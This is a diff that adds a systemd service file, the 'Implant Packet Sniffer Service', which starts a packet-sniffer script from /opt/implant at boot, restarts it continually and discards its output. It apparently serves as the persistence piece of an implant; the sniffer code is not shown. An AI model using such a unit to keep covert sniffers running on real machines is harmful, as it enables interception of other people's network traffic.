@@ -1,0 +1,13 @@
+[Unit]
+Description=Implant Packet Sniffer Service
+After=network.target
+
+[Service]
+ExecStart=/opt/implant/scripts/packet-sniffer.sh
+Restart=always
+RestartSec=3
+StandardOutput=null
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
